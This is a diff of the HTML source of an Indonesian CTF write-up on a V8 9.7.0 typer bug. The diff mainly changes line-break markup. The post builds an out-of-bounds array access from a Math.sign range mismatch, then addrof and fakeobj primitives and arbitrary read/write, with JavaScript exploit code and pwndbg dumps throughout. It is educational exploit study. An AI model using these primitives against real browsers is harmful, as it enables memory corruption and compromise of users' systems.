+Writeup diatas sedikit mirip dengan chall ini, jadi intinya kita memanfaatkan typer bug untuk membuat nilai di Turbolizer dengan nilai sesungguhnya berbeda agar bisa mentrigger <strong>OOB</strong>.<br />
 Biar lebih kebayang contohnya seperti ini.</p>
 
-<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr>
-<td class="gutter gl"><pre class="lineno">1
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -1028,8 +198,7 @@ Biar lebih kebayang contohnya seperti ini.</p>
 10
 11
 12
-</pre></td>
-<td class="code"><pre><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
+</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="kc">Infinity</span><span class="p">};</span>
     <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="kc">Infinity</span><span class="o">-</span><span class="nx">a</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span>
     <span class="nx">v</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
@@ -1041,23 +210,22 @@ Biar lebih kebayang contohnya seperti ini.</p>
 	<span class="nx">foo</span><span class="p">();</span>
 <span class="p">}</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">foo</span><span class="p">());</span> <span class="c1">//0</span>
-</pre></td>
-</tr></tbody></table></code></pre></figure>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Jalankan dengan <code class="language-plaintext highlighter-rouge">--trace-turbo</code> lalu buka di turbolizer. Hasilnya seperti ini
-<img src="/assets/images/quickmaffs/quick6.png" alt="Quick6">
+<img src="/assets/images/quickmaffs/quick6.png" alt="Quick6" />
 Kita bisa lihat pada gambar diatas, saat nilai <code class="language-plaintext highlighter-rouge">v</code> yang awalnya <code class="language-plaintext highlighter-rouge">NaN</code> lalu kita shift left sekali <code class="language-plaintext highlighter-rouge">v &gt;&gt;= 1</code>,
 Result di Turbolizer menunjukkan <code class="language-plaintext highlighter-rouge">Range(-1073741824, 1073741823)</code> yang artinya result <code class="language-plaintext highlighter-rouge">v &gt;&gt;= 1</code> bisa bernilai <code class="language-plaintext highlighter-rouge">-1073741824 s/d 1073741823</code>,
-dan result yang sebenarnya muncul adalah <code class="language-plaintext highlighter-rouge">0</code>.<br>
-Nah karena <code class="language-plaintext highlighter-rouge">0</code> masih termasuk dari range <code class="language-plaintext highlighter-rouge">-1073741824 - 1073741823</code>, artinya kita belum berhasil menipu si Turbolizernya.<br>
-Nah bagaimana caranya? agar nilai yang sesungguhnya itu berbeda dengan dengan nilai dari Turbolizer?<br></p>
+dan result yang sebenarnya muncul adalah <code class="language-plaintext highlighter-rouge">0</code>.<br />
+Nah karena <code class="language-plaintext highlighter-rouge">0</code> masih termasuk dari range <code class="language-plaintext highlighter-rouge">-1073741824 - 1073741823</code>, artinya kita belum berhasil menipu si Turbolizernya.<br />
+Nah bagaimana caranya? agar nilai yang sesungguhnya itu berbeda dengan dengan nilai dari Turbolizer?<br /></p>
 
 <p>Hasil dari <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code> adalah <code class="language-plaintext highlighter-rouge">PlainNumber</code> yang artinya bisa bernilai <code class="language-plaintext highlighter-rouge">Range(-Inf, Inf)</code>, namun saat kita shift left sekali,
-Hasilnya adalah <code class="language-plaintext highlighter-rouge">Range(-1073741824, 1073741823)</code>.<br>
-Maka kita bisa beri asumsi nilai <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code>,<br>
+Hasilnya adalah <code class="language-plaintext highlighter-rouge">Range(-1073741824, 1073741823)</code>.<br />
+Maka kita bisa beri asumsi nilai <code class="language-plaintext highlighter-rouge">Math.exp(NaN)</code>,<br />
 saat bug telah di trigger adalah <code class="language-plaintext highlighter-rouge">Range(-2147483648, 2147483647)</code>. Ini hanya asumsi sementara, goals kita adalah membuat nilai di Turbolizer itu kecil
-sedangkan nilai yang sebenarnya (nilai yang muncul saat di print) itu besar, sehingga saat kita bisa mentrigger OOB.<br>
-Oke coba kita lihat source dari <code class="language-plaintext highlighter-rouge">src/compiler/operation-typer.cc</code> untuk melihat apakah ada fungsi <code class="language-plaintext highlighter-rouge">Math</code> yang bisa kita gunakan.<br>
+sedangkan nilai yang sebenarnya (nilai yang muncul saat di print) itu besar, sehingga saat kita bisa mentrigger OOB.<br />
+Oke coba kita lihat source dari <code class="language-plaintext highlighter-rouge">src/compiler/operation-typer.cc</code> untuk melihat apakah ada fungsi <code class="language-plaintext highlighter-rouge">Math</code> yang bisa kita gunakan.<br />
 Disini saya menemukan fungsi <code class="language-plaintext highlighter-rouge">NumberSign()</code> atau di JS itu <code class="language-plaintext highlighter-rouge">Math.sign()</code>.</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Type</span> <span class="nx">OperationTyper</span><span class="p">::</span><span class="nx">NumberSign</span><span class="p">(</span><span class="nx">Type</span> <span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">DCHECK</span><span class="p">(</span><span class="nx">type</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">Type</span><span class="p">::</span><span class="nb">Number</span><span class="p">()));</span>
@@ -1113,10 +281,10 @@ Disini saya menemukan fungsi <code class="language-plaintext highlighter-rouge">
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">foo</span><span class="p">());</span> <span class="c1">//-2147483648</span>
 </code></pre></div></div>
 <p>Hasilnya seperti ini.
-<img src="/assets/images/quickmaffs/quick7.png" alt="Quick7">
-Boom! saat <code class="language-plaintext highlighter-rouge">Number.sign(v)</code> nilai di turbolizer adalah <code class="language-plaintext highlighter-rouge">Range(-1, 1)</code> sedangkan nilai saat di print adalah <code class="language-plaintext highlighter-rouge">-2147483648</code>.<br>
+<img src="/assets/images/quickmaffs/quick7.png" alt="Quick7" />
+Boom! saat <code class="language-plaintext highlighter-rouge">Number.sign(v)</code> nilai di turbolizer adalah <code class="language-plaintext highlighter-rouge">Range(-1, 1)</code> sedangkan nilai saat di print adalah <code class="language-plaintext highlighter-rouge">-2147483648</code>.<br />
 Dengan ini kita sudah setengah jalan, selanjutnya kita bisa ikuti <a href="https://www.n1net4il.kr/posts/cve-2020-6383-analysis">CVE-2020-6383</a> 
-agar <code class="language-plaintext highlighter-rouge">Range()</code> di Turbolizer sama nilainya dengan writeup itu.<br></p>
+agar <code class="language-plaintext highlighter-rouge">Range()</code> di Turbolizer sama nilainya dengan writeup itu.<br /></p>
 
 <p>Maka Script kita seperti ini</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
@@ -1139,14 +307,14 @@ agar <code class="language-plaintext highlighter-rouge">Range()</code> di Turbol
 <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">12</span><span class="p">]);</span>
 </code></pre></div></div>
-<p><img src="/assets/images/quickmaffs/quick8.png" alt="Quick8">
+<p><img src="/assets/images/quickmaffs/quick8.png" alt="Quick8" />
 BOOM OOB TRIGGER
 Saat kita membuat Array, size array yang terbuat di Turbolizer adalah <code class="language-plaintext highlighter-rouge">11</code>, namun karena nilai sesungguhnya itu <code class="language-plaintext highlighter-rouge">-1073741813</code>, maka OOB berahsil kita Trigger.</p>
 
 <h2 id="oob">OOB</h2>
 <p>Sayangnya perjalanan kita tidak sampai di situ saja heheh, untuk referensi OOB bisa lihat di <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">sini</a>.
-Nah sayangnya OOB yang dijelaskan di blognya faith adalah v8 versi lama, sedangkan v8 yang kita gunakan adalah versi 9.7.0.<br>
-Dimana ada banyak perubahan dari Tag Pointer, Struktur Object, dll <a href="https://v8.dev/blog/pointer-compression">(Pointer Compression in V8)</a>.<br></p>
+Nah sayangnya OOB yang dijelaskan di blognya faith adalah v8 versi lama, sedangkan v8 yang kita gunakan adalah versi 9.7.0.<br />
+Dimana ada banyak perubahan dari Tag Pointer, Struktur Object, dll <a href="https://v8.dev/blog/pointer-compression">(Pointer Compression in V8)</a>.<br /></p>
 
 <p>Oke first, kita ubah dulu script kita untuk persiapan seperti dari blognya faith</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">])</span>
@@ -1188,7 +356,7 @@ Dimana ada banyak perubahan dari Tag Pointer, Struktur Object, dll <a href="http
 <span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
 </code></pre></div></div>
 
-<p>Disini saya tidak akan menjelaskan secara detail setiap fungsi2nya karena kalian bisa baca di blognya faith diatas.<br>
+<p>Disini saya tidak akan menjelaskan secara detail setiap fungsi2nya karena kalian bisa baca di blognya faith diatas.<br />
 Mungkin saya akan jelaskan cukup detail masalah OOB ini. Saya sarankan juga untuk build v8 versi debugnya, untuk cara buildnya hampir sama seperti v8 release,
 tinggal mengganti release dengan debug.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./tools/dev/v8gen.py x64.debug
@@ -1240,7 +408,7 @@ $ ninja -C ./out.gn/x64.debug # Debug version
 <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">]</span>
 </code></pre></div></div>
 <p>Nah loh bingung lagi banyak bener isinya, yang perlu kita lihat adalah <strong>JSArray</strong> dan <strong>Map</strong>, perlu diingat karena v8 menggunakan tag pointer,
-intinya kita harus mengurangi 1 bytes untuk melihat isi addressnya.<br></p>
+intinya kita harus mengurangi 1 bytes untuk melihat isi addressnya.<br /></p>
 
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">x</span><span class="o">/</span><span class="mi">4</span><span class="nx">gx</span> <span class="mh">0x2cea08105ac9</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="nx">JSArray</span>
 <span class="mh">0x2cea08105ac8</span><span class="p">:</span>	<span class="mh">0x0800222d082c3ae1</span>	<span class="mh">0x0000000408105ab1</span> <span class="o">&lt;&lt;</span> <span class="nx">Pointer</span> <span class="nx">to</span> <span class="nx">value</span> <span class="nx">dari</span> <span class="nx">JSArray</span>
@@ -1265,8 +433,8 @@ Nah untuk angka depannya itu sama sesuai dengan address heap yang kita dapatkan 
 <p>Jadi sederhananya jika kita mau print <code class="language-plaintext highlighter-rouge">a[0]</code>, maka akan memanggil pointer dari <strong>JSArray+7</strong> atau <code class="language-plaintext highlighter-rouge">0x0000000408105ab1+7</code>.
 Semoga sampai sini kebayang lah ya.</p>
 
-<p>Oke next untuk penjalasan dari <strong>Map</strong> pada v8, kalian bisa baca pada blognya faith, saya akan langsung masuk ke contoh saja.<br>
-Jadi disini kita bisa melakukan overwrite <strong>Map</strong> dari <strong>JSArray</strong> yang kita punya untuk melakukan leak. Bagaimana caranya? <br>
+<p>Oke next untuk penjalasan dari <strong>Map</strong> pada v8, kalian bisa baca pada blognya faith, saya akan langsung masuk ke contoh saja.<br />
+Jadi disini kita bisa melakukan overwrite <strong>Map</strong> dari <strong>JSArray</strong> yang kita punya untuk melakukan leak. Bagaimana caranya? <br />
 Oh ya jangan lupa jika ingin trigger <strong>OOB</strong> harus pada versi <strong>release</strong> jangan debug ya.</p>
 
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">run</span> <span class="o">--</span><span class="nx">allow</span><span class="o">-</span><span class="nx">natives</span><span class="o">-</span><span class="nx">syntax</span> <span class="o">--</span><span class="nx">shell</span> <span class="nx">test</span><span class="p">.</span><span class="nx">js</span> 
@@ -1300,10 +468,10 @@ Oh ya jangan lupa jika ingin trigger <strong>OOB</strong> harus pada versi <stro
 Nah dari penjelasan faith yang</p>
 
 <p>Nah dari yang kita lihat diatas, <strong>Map</strong> dari <strong>obj_arr</strong> atau <strong>Array of object</strong>. Index 0 dari float array biasa, adalah float value, sedangkan index 0 dari <strong>Array of object</strong>
-adalah value address dari <strong>obj</strong> itu sendiri. Namun saat kita call obj_arr[0], itu bukan print address dari <strong>obj</strong> namun akan print <code class="language-plaintext highlighter-rouge">{A: 1.1}</code>.<br></p>
+adalah value address dari <strong>obj</strong> itu sendiri. Namun saat kita call obj_arr[0], itu bukan print address dari <strong>obj</strong> namun akan print <code class="language-plaintext highlighter-rouge">{A: 1.1}</code>.<br /></p>
 
-<p>Nah bagaimana jika kita overwrite <strong>Map</strong> dari <strong>obj_arr</strong> ke <strong>Map</strong> dari float array?.<br>
-Benar, saat kita akses obj_arr[0] hasilnya bukan print <code class="language-plaintext highlighter-rouge">{A: 1.1}</code> namun akan print value address dari obj itu sendiri.<br>
+<p>Nah bagaimana jika kita overwrite <strong>Map</strong> dari <strong>obj_arr</strong> ke <strong>Map</strong> dari float array?.<br />
+Benar, saat kita akses obj_arr[0] hasilnya bukan print <code class="language-plaintext highlighter-rouge">{A: 1.1}</code> namun akan print value address dari obj itu sendiri.<br />
 Lets see how it works. Pertama-tama kita buat inisialisasi variable2 yang kita butuhkan terlebih dahulu.</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="kc">Infinity</span><span class="p">};</span>
@@ -1345,7 +513,7 @@ Lets see how it works. Pertama-tama kita buat inisialisasi variable2 yang kita b
 <span class="mh">0xc4308282168</span><span class="p">:</span>	<span class="mh">0x0000000208002205</span>	<span class="mh">0x08002a9500000000</span>
 </code></pre></div></div>
 
-<p><strong>Map</strong> dari <strong>float_arr</strong> adalah <code class="language-plaintext highlighter-rouge">0x08203ae1</code> dan <strong>Map</strong> dari <strong>obj</strong> adalah <code class="language-plaintext highlighter-rouge">0x08205cc9</code>.<br>
+<p><strong>Map</strong> dari <strong>float_arr</strong> adalah <code class="language-plaintext highlighter-rouge">0x08203ae1</code> dan <strong>Map</strong> dari <strong>obj</strong> adalah <code class="language-plaintext highlighter-rouge">0x08205cc9</code>.<br />
 Pertama-tama kita harus leak value ini terlebih dahulu lewat OOB. Kita bisa check indexnya dengan loop print seperti ini</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
 <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mf">1.1</span><span class="p">};</span>
@@ -1358,7 +526,7 @@ Pertama-tama kita harus leak value ini terlebih dahulu lewat OOB. Kita bisa chec
     <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span> <span class="nx">i</span><span class="p">);</span>
 </code></pre></div></div>
 
-<p>Didapat <strong>Map</strong> dari <strong>float_arr</strong> pada index-31 dan <strong>Map</strong> dari <strong>obj</strong> pada index-21. Maka kita bisa ambil valuenya.<br>
+<p>Didapat <strong>Map</strong> dari <strong>float_arr</strong> pada index-31 dan <strong>Map</strong> dari <strong>obj</strong> pada index-21. Maka kita bisa ambil valuenya.<br />
 Perlu diingkat karena kita hanya perlu abis 4 bytes saja karena tag pointer v8.</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
 <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mf">1.1</span><span class="p">};</span>
@@ -1369,7 +537,7 @@ Perlu diingkat karena kita hanya perlu abis 4 bytes saja karena tag pointer v8.<
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Float_arr_map: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">float_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
 <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Obj_arr_map: 0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">obj_arr_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
 </code></pre></div></div>
-<p>Selanjutnya kita coba overwrite value dari <strong>Map</strong> dari variable <strong>obj_arr</strong> menjadi value <strong>Map of float_arr</strong>.<br></p>
+<p>Selanjutnya kita coba overwrite value dari <strong>Map</strong> dari variable <strong>obj_arr</strong> menjadi value <strong>Map of float_arr</strong>.<br /></p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pwndbg</span><span class="o">&gt;</span> <span class="nx">run</span> <span class="o">--</span><span class="nx">allow</span><span class="o">-</span><span class="nx">natives</span><span class="o">-</span><span class="nx">syntax</span> <span class="o">--</span><span class="nx">shell</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span> 
 <span class="nx">Starting</span> <span class="nx">program</span><span class="p">:</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">linuz</span><span class="o">/</span><span class="nx">Desktop</span><span class="o">/</span><span class="nx">CSI</span><span class="o">/</span><span class="nx">BrowserEXP</span><span class="o">/</span><span class="nx">Modern</span><span class="o">/</span><span class="nx">pwn_modern_typer</span><span class="o">/</span><span class="nx">v8</span><span class="o">/</span><span class="nx">out</span><span class="p">.</span><span class="nx">gn</span><span class="o">/</span><span class="nx">x64</span><span class="p">.</span><span class="nx">release</span><span class="o">/</span><span class="nx">d8</span> <span class="o">--</span><span class="nx">allow</span><span class="o">-</span><span class="nx">natives</span><span class="o">-</span><span class="nx">syntax</span> <span class="o">--</span><span class="nx">shell</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span>
 <span class="nx">ERROR</span><span class="p">:</span> <span class="nx">Could</span> <span class="nx">not</span> <span class="nx">find</span> <span class="nx">ELF</span> <span class="nx">base</span><span class="o">!</span>
@@ -1418,8 +586,8 @@ Caranya seperti ini.</p>
 <span class="p">{</span><span class="na">A</span><span class="p">:</span> <span class="mf">1.1</span><span class="p">}</span>
 <span class="nx">d8</span><span class="o">&gt;</span>
 </code></pre></div></div>
-<p>Boom! dengan ini kita bisa mendapatkan value dari address yang kita buat.<br>
-Inilah yang kita namakan <code class="language-plaintext highlighter-rouge">addrof</code> primitive selanjutnya kita buat fungsi <code class="language-plaintext highlighter-rouge">fakeobj</code> tinggal balik saja.<br></p>
+<p>Boom! dengan ini kita bisa mendapatkan value dari address yang kita buat.<br />
+Inilah yang kita namakan <code class="language-plaintext highlighter-rouge">addrof</code> primitive selanjutnya kita buat fungsi <code class="language-plaintext highlighter-rouge">fakeobj</code> tinggal balik saja.<br /></p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">k</span><span class="p">){</span>
     <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">;</span>
     <span class="nx">oob</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">float_arr_map</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
@@ -1438,8 +606,8 @@ Inilah yang kita namakan <code class="language-plaintext highlighter-rouge">addr
 </code></pre></div></div>
 
 <h2 id="arbitary-read--write">Arbitary Read / Write</h2>
-<p>Nah sekarang kita sudah punya <code class="language-plaintext highlighter-rouge">addrof</code> dan <code class="language-plaintext highlighter-rouge">fakeobj</code> primitives. Namun untuk ARB/W pada v8 sedikit kompleks.<br>
-Untuk bisa ARB/W pertama2 kita perlu buat float array dengan index 0 adalah value dari <strong>float_arr_map</strong>.<br>
+<p>Nah sekarang kita sudah punya <code class="language-plaintext highlighter-rouge">addrof</code> dan <code class="language-plaintext highlighter-rouge">fakeobj</code> primitives. Namun untuk ARB/W pada v8 sedikit kompleks.<br />
+Untuk bisa ARB/W pertama2 kita perlu buat float array dengan index 0 adalah value dari <strong>float_arr_map</strong>.<br />
 Oke langsung aja contohnya seperti ini.</p>
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="na">x</span><span class="p">:</span> <span class="kc">Infinity</span><span class="p">};</span>
@@ -1505,12 +673,12 @@ Oke langsung aja contohnya seperti ini.</p>
 <span class="mh">0x342a0834ebe8</span><span class="p">:</span>	<span class="mh">0x00000002080029cd</span>	<span class="mh">0x0000000008203ae1</span>
 
 </code></pre></div></div>
-<p>Pastikan kalian run melalui script, karena kalau kalian running addrof dan fakeobj primitive di v8 nya langsung, akan terdapat sedikit error, sehingga hasilnya menjadi salah.<br>
+<p>Pastikan kalian run melalui script, karena kalau kalian running addrof dan fakeobj primitive di v8 nya langsung, akan terdapat sedikit error, sehingga hasilnya menjadi salah.<br />
 Nah lihat yang saya tandain bintang, kita akan menaruh fake object kita disana (<code class="language-plaintext highlighter-rouge">0x342a0834ebc8</code>), value ini bisa kita dapatkan dari <code class="language-plaintext highlighter-rouge">addrof(arr2)+0x20n</code>.
-Jika kita sudah menaruh fake object di <code class="language-plaintext highlighter-rouge">0x342a0834ebc8</code> maka kita bisa mengontrol value di <code class="language-plaintext highlighter-rouge">0x342a0834ebd0</code> atau index ke-1 dari <code class="language-plaintext highlighter-rouge">arr2</code>.<br></p>
+Jika kita sudah menaruh fake object di <code class="language-plaintext highlighter-rouge">0x342a0834ebc8</code> maka kita bisa mengontrol value di <code class="language-plaintext highlighter-rouge">0x342a0834ebd0</code> atau index ke-1 dari <code class="language-plaintext highlighter-rouge">arr2</code>.<br /></p>
 
-<p>Nah jika kalian lihat pada <code class="language-plaintext highlighter-rouge">0x342a0834eba8</code> disitu terdapat <strong>Map</strong> dari <strong>Arr2</strong> <code class="language-plaintext highlighter-rouge">(0x0800222d08042118)</code> dan selanjutnya pada <code class="language-plaintext highlighter-rouge">0x342a0834ebb0</code> terdapat pointer ke value dari <strong>Arr2</strong> yaitu <code class="language-plaintext highlighter-rouge">0x000000080834ebc1</code>. Untuk isi valuenya terdapat pada <code class="language-plaintext highlighter-rouge">0x000000080834ebc1+7</code>, Nah bagaimana jika kita ubah value dari <strong>arr2[1]</strong> menjadi address yang ingin kita leak?<br>
-Misalnya kita ingin leak address dari <code class="language-plaintext highlighter-rouge">0x342a0834eba8</code> maka kita hanya perlu ambil 4 bytes belakangnya dan sesuaikan dengan format dari pointer of value yaitu <code class="language-plaintext highlighter-rouge">0x08xxxxxxxx</code>.<br>
+<p>Nah jika kalian lihat pada <code class="language-plaintext highlighter-rouge">0x342a0834eba8</code> disitu terdapat <strong>Map</strong> dari <strong>Arr2</strong> <code class="language-plaintext highlighter-rouge">(0x0800222d08042118)</code> dan selanjutnya pada <code class="language-plaintext highlighter-rouge">0x342a0834ebb0</code> terdapat pointer ke value dari <strong>Arr2</strong> yaitu <code class="language-plaintext highlighter-rouge">0x000000080834ebc1</code>. Untuk isi valuenya terdapat pada <code class="language-plaintext highlighter-rouge">0x000000080834ebc1+7</code>, Nah bagaimana jika kita ubah value dari <strong>arr2[1]</strong> menjadi address yang ingin kita leak?<br />
+Misalnya kita ingin leak address dari <code class="language-plaintext highlighter-rouge">0x342a0834eba8</code> maka kita hanya perlu ambil 4 bytes belakangnya dan sesuaikan dengan format dari pointer of value yaitu <code class="language-plaintext highlighter-rouge">0x08xxxxxxxx</code>.<br />
 Final payload menjadi <code class="language-plaintext highlighter-rouge">0x080834eba8-7</code>. Lets try, pertama2 kita put fakeobj terlebih dahulu di script</p>
 
 <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
@@ -1561,7 +729,7 @@ Final payload menjadi <code class="language-plaintext highlighter-rouge">0x08083
 <span class="mh">0x19c808095238</span><span class="p">:</span>	<span class="mh">0x3ff3333333333333</span>	<span class="mh">0x3ff4cccccccccccd</span>
 <span class="mh">0x19c808095248</span><span class="p">:</span>	<span class="mh">0x00000002080029cd</span>	<span class="mh">0x0000000008203ae1</span>
 </code></pre></div></div>
-<p>Misal kita ingin leak address <code class="language-plaintext highlighter-rouge">0x19c808095208</code> maka value yang perlu kita ubah pada arr2[1] adalah <code class="language-plaintext highlighter-rouge">0x808095208-7</code>.<br></p>
+<p>Misal kita ingin leak address <code class="language-plaintext highlighter-rouge">0x19c808095208</code> maka value yang perlu kita ubah pada arr2[1] adalah <code class="language-plaintext highlighter-rouge">0x808095208-7</code>.<br /></p>
